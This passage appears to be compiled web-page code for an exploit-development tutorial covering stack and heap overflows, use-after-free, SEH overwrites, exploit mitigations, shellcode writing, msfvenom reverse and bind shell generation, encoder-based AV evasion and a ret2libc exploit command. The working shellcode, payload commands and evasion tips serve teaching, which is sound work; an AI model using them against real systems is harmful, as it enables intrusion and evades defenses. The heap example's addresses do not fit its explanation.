            children: "Direct control flow hijack"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stack canaries (SSP) detect it immediately"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Stable if address is fixed"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ASLR randomizes target addresses"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Works on unprotected binaries"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DEP/NX prevents shellcode execution on stack"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Well-understood technique"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Modern compilers enable canaries by default"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "228-edge-cases",
      children: "2.2.8 Edge Cases"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Edge Case"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Behavior"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mitigation"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Null bytes in address"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "strcpy"
            }), " stops at null"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use address without null bytes or use non-null gadgets"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Newlines/carriage returns"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "gets"
            }), " stops at newline"]
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: ["Use ", (0,jsx_runtime.jsx)(_components.code, {
              children: "fgets"
            }), " or ", (0,jsx_runtime.jsx)(_components.code, {
              children: "read()"
            }), " syscall"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Partial overwrite of return address"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hijacks to nearby function (ret2plt)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ASLR makes partial overwrites unreliable"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Overwriting exact EBP"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stack frame corruption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Canaries detect EBP/return addr modification"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Very small buffer (< 16 bytes)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Limited overwrite space"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use ROP chain or ret2libc"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "23-heap-buffer-overflow",
      children: "2.3 Heap Buffer Overflow"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "231-anatomy",
      children: "2.3.1 Anatomy"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " The heap is like a community storage shed. You check out a box (malloc), but you put more stuff in it than it can hold. The excess spills into the next person's box. When they open their box, they find your stuff, or worse → the shed manager's ledger is right next to your box, and you overwrite who owns what."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["Heap overflows corrupt heap metadata → chunk headers with size fields, forward/backward free-list pointers → leading to arbitrary write when ", (0,jsx_runtime.jsx)(_components.code, {
        children: "free()"
      }), " processes the corrupted chunk."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "232-vulnerable-c-program",
      children: "2.3.2 Vulnerable C Program"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-c",
        children: "// heap_vuln.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n    if (argc < 2) { printf(\"Usage: %s <data>\\n\", argv[0]); return 1; }\n\n    char *secret = malloc(16);  // holds a secret\n    char *buffer = malloc(16);  // adjacent chunk\n\n    strcpy(secret, \"TOP_SECRET_123\");\n    printf(\"secret at %p: %s\\n\", secret, secret);\n    printf(\"buffer at %p\\n\", buffer);\n\n    strcpy(buffer, argv[1]);    // OVERFLOW → writes past buffer into secret\n    printf(\"secret after overflow: %s\\n\", secret);\n\n    free(buffer);\n    free(secret);\n    return 0;\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Output:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "$ ./heap_vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nsecret at 0x804a008: TOP_SECRET_123\nbuffer at 0x804a018\nsecret after overflow: AAAAAAAAAAAAAAAA\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["The 16-byte ", (0,jsx_runtime.jsx)(_components.code, {
        children: "buffer"
      }), " chunk (at 0x804a018) overflows into the adjacent ", (0,jsx_runtime.jsx)(_components.code, {
        children: "secret"
      }), " chunk (at 0x804a008). On the heap, chunks are adjacent:"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Before overflow:\n+------------+------------+\n| secret[16] | buffer[16] |  ← metadata between chunks\n+------------+------------+\n\nAfter overflow with 32+ bytes:\n+------------+------------+\n| secret[16] | AAAAAAA... |  ← secret's content overwritten\n+------------+------------+\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "233-use-after-free-uaf",
      children: "2.3.3 Use-After-Free (UAF)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-c",
        children: "char *ptr = malloc(16);\nstrcpy(ptr, \"hello\");\nfree(ptr);              // memory freed\n// ... attacker controls the allocator state ...\nprintf(\"%s\\n\", ptr);    // USE AFTER FREE → dangling pointer\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "234-complexity-analysis",
      children: "2.3.4 Complexity Analysis"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Overflow"
        }), ": O(n) for copy"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Heap feng shui"
        }), ": NP-hard, requires careful allocator manipulation"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Double-free detection"
        }), ": O(1) if tcache detects; otherwise subtle"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "235-ad-table",
      children: "2.3.5 A&D Table"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Advantage"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Disadvantage"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Bypasses stack canaries"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Heap metadata corruption can crash process"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Larger overflow space (heap grows)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Allocator implementation complexity (glibc/ptmalloc)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Can corrupt function pointers in structs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ASLR randomizes heap base"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Persists beyond function return"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires precise heap layout grooming"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "24-seh-overflow-windows",
      children: "2.4 SEH Overflow (Windows)"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "241-anatomy",
      children: "2.4.1 Anatomy"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Windows structured exception handling is like a chain of emergency exits. When an exception occurs (fire), Windows walks the chain looking for someone to handle it. An SEH overflow overwrites one of the emergency exit signs to point to the attacker's door instead."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["On Windows, when ", (0,jsx_runtime.jsx)(_components.code, {
        children: "__try/__except"
      }), " is used, an EXCEPTION_REGISTRATION_RECORD is placed on the stack:"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "typedef struct _EXCEPTION_REGISTRATION_RECORD {\n    struct _EXCEPTION_REGISTRATION_RECORD *Next;  // next handler in chain\n    PEXCEPTION_ROUTINE Handler;                    // exception handler function\n} EXCEPTION_REGISTRATION_RECORD;\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["The ", (0,jsx_runtime.jsx)(_components.code, {
        children: "Handler"
      }), " field points to the exception handler. An overflow can overwrite this pointer. When an exception fires (access violation after overflow), the corrupted handler executes attacker code."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Practical exploitation (SafeSEH bypass):"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Overflow buffer → overwrite SEH handler pointer"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Trigger exception (e.g., write to invalid memory)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Handler executes attacker-controlled address"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Modern mitigations: SafeSEH (validates handler address), SEHOP (validates chain integrity)."
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "25-buffer-overflow-defenses-comparison",
      children: "2.5 Buffer Overflow Defenses Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Defense"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Bypass"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Effectiveness"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Stack Canary"
            })
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: ["Random value placed before return address; checked before ", (0,jsx_runtime.jsx)(_components.code, {
              children: "ret"
            })]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Info leak to read canary value; or overwrite canary with itself if fork-based server"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: ["High → default in GCC/Clang (", (0,jsx_runtime.jsx)(_components.code, {
              children: "-fstack-protector"
            }), ")"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "ASLR"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Randomizes base addresses of stack, heap, libc, PIE binary"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Info leak (format string, side channel) or brute-force (32-bit: ~2^16)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High on 64-bit (28+ bits entropy)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "DEP/NX"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Marks stack/heap as non-executable; CPU refuses to execute code there"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ROP → reuse existing code (libc gadgets)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very high against shellcode injection"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "CFG"
            }), " (Control Flow Guard)"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Inserted checks at indirect call sites verify target is in valid function table"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Find function with CFG check disabled or bypass the check"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High on Windows 10+"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "SEHOP"
            }), " (SEH Overwrite Protection)"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Validates SEH chain integrity before dispatching exception"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Corrupt SEH chain pointer to a valid-looking fake chain"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Moderate → can be bypassed if attacker controls chain pointer"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "SafeSEH"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Validates exception handler address is within a registered module"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use module not compiled with SafeSEH; or address in non-SafeSEH module"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Moderate → varies by module"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "PIE"
            }), " (Position Independent Executable)"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Randomizes code base address (extends ASLR to binary itself)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Info leak of binary base"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High → default in modern Linux distros"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "RELRO"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Makes GOT read-only after relocation (Full RELRO)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Partial RELRO: overwrite GOT entry; Full RELRO: need other targets"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High → Full RELRO prevents GOT overwrite"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-3-shellcode-development",
      children: "Section 3: Shellcode Development"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "31-what-is-shellcode",
      children: "3.1 What Is Shellcode?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Shellcode is like a skeleton key. Instead of being a full replacement key (program), it's a tiny piece of precisely machined metal (minimal machine code) that does exactly one thing → open the door (spawn a shell). It must fit in tight spaces (small buffer) and avoid breaking the lock (null-byte-free)."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["Shellcode is position-independent machine code that executes the attacker's intent → typically spawning a shell (", (0,jsx_runtime.jsx)(_components.code, {
        children: "/bin/sh"
      }), "), creating a reverse shell, or adding a backdoor user."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Constraints:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Must be position-independent (PIC)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Must be null-byte-free (string functions stop at null)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Must be small (buffer constraints)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Must avoid bad characters depending on vulnerability context"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "32-writing-shellcode-in-assembly-linux-x86",
      children: "3.2 Writing Shellcode in Assembly (Linux x86)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-assembly",
        children: "; shellcode.asm → execve(\"/bin/sh\", NULL, NULL) → 23 bytes, null-free\n; nasm -f elf32 shellcode.asm -o shellcode.o\n; ld -m elf_i386 -o shellcode shellcode.o\n\nBITS 32\n\n; Clear registers\nxor eax, eax        ; eax = 0\nxor ebx, ebx        ; ebx = 0\nxor ecx, ecx        ; ecx = 0\nxor edx, edx        ; edx = 0\n\n; Push \"/bin//sh\" onto stack (8 bytes, // fills to alignment)\npush ebx            ; null terminator\npush 0x68732f2f     ; \"hs//\"\npush 0x6e69622f     ; \"nib/\"\n\nmov ebx, esp        ; ebx = pointer to \"/bin//sh\"\n\n; execve syscall\n; syscall number: 11 (0x0b)\nmov al, 0x0b        ; lower byte of eax = 11 (execve syscall)\nint 0x80            ; trigger interrupt\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Extracted shellcode bytes:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-c",
        children: "unsigned char shellcode[] = \n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\"\n\"\\x53\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\"\n\"\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\";\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Testing the shellcode:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-c",
        children: "// test_shellcode.c\n#include <stdio.h>\n#include <sys/mman.h>\n#include <string.h>\n#include <unistd.h>\n\nunsigned char shellcode[] = \n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\"\n\"\\x53\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\"\n\"\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\";\n\nint main() {\n    printf(\"Shellcode length: %ld\\n\", sizeof(shellcode) - 1);\n    // Make memory executable\n    mprotect((void *)((long)shellcode & ~0xfff), 4096, PROT_READ | PROT_WRITE | PROT_EXEC);\n    // Cast shellcode to a function pointer and call it\n    void (*code)() = (void (*)())shellcode;\n    code();\n    return 0;\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Compilation and test:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "$ gcc -z execstack -o test_shellcode test_shellcode.c\n$ ./test_shellcode\nShellcode length: 23\n$                         # Shell spawned → exit with Ctrl+D\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "33-practical-msfvenom-shellcode-generation",
      children: "3.3 Practical: msfvenom Shellcode Generation"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Linux x86 reverse shell shellcode (null-free)\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 \\\n         -b \"\\x00\" -f c\n\n# Output:\n# unsigned char buf[] = \n# \"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\"\n# \"\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\xc0\\xa8\\x01\"\n# \"\\x64\\x68\\x02\\x00\\x11\\x5c\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x51\\x56\"\n# \"\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc3\\xb0\\x0f\\xcd\\x80\\x31\\xc0\"\n# \"\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\"\n# \"\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";\n\n# Windows x86 bind shell (staged)\nmsfvenom -p windows/shell_bind_tcp LPORT=4444 -b \"\\x00\\x0a\\x0d\" -f exe -o shell.exe\n\n# Encoded payload with shikata_ga_nai (polymorphic)\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 \\\n         -e x86/shikata_ga_nai -i 5 -f c\n\n# List all available payloads\nmsfvenom -l payloads\n\n# Custom bad character set (common in strcpy-based overflows)\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 \\\n         -b \"\\x00\\x0a\\x0d\\x20\\x0b\\x0c\\x09\" -f ps1\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "34-shellcode-encoding-and-obfuscation",
      children: "3.4 Shellcode Encoding and Obfuscation"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Why encode?"
      }), " Filters and IDS signatures block known shellcode patterns. Encoders transform shellcode to evade detection."]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Encoder"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Technique"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Evasion"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "shikata_ga_nai"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "XOR additive feedback (polymorphic)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Signature-based AV"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "countdown"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Single-byte XOR with decreasing key"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Basic signature"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "call4_dword_xor"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "XOR with 4-byte key using call technique"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Static analysis"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "alpha_mixed"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Alphanumeric shellcode (only printable ASCII)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Input filters"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "x86/unicode_upper"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unicode-safe shellcode"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unicode-based input"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Example: Alphanumeric shellcode generation:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/alpha_mixed -f c\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-4-advanced-exploitation-techniques",
      children: "Section 4: Advanced Exploitation Techniques"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "41-return-to-libc-ret2libc",
      children: "4.1 Return-to-libc (ret2libc)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Since the stack can't run code directly (DEP/NX), it's like being in a library where you can't write new books but you can pick existing books off the shelf and open them. ret2libc picks ", (0,jsx_runtime.jsx)(_components.code, {
        children: "system()"
      }), " off the libc shelf, sets the arguments correctly, and calls it to spawn a shell."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Concept:"
      }), " Instead of jumping to shellcode on the stack (blocked by NX), return to a libc function like ", (0,jsx_runtime.jsx)(_components.code, {
        children: "system()"
      }), " with controlled arguments."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Stack layout for ret2libc:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Before overflow:\n+-------------------+\n| return address    | → overwrite with address of system() in libc\n+-------------------+\n| saved EBP         | → overwrite with junk or valid frame\n+-------------------+\n| buffer[64]        |\n+-------------------+\n\nAfter overflow layout:\n+-------------------+\n| &system()         | → overwrites return address\n+-------------------+\n| fake ret after    | → address to return after system() (or junk)\n+-------------------+\n| pointer to cmd    | → first argument to system() → in our case \"/bin/sh\"\n+-------------------+\n| \"/bin/sh\\0\"       | → string in buffer or in libc itself\n+-------------------+\n| padding           |\n+-------------------+\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Finding libc addresses:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "$ ldd vuln | grep libc\n    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e00000)\n\n$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system\n  1405: 0003d200   55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0\n\n$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep \"/bin/sh\"\n  17e0f3 /bin/sh\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Exploit:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "$ ./vuln $(python2 -c 'print \"A\"*76 + \"\\x00\\xd2\\x03\\xf7\" + \"FAKE\" + \"\\xf3\\xe0\\x17\\xf7\"')\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "42-return-oriented-programming-rop",
      children: "4.2 Return-Oriented Programming (ROP)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
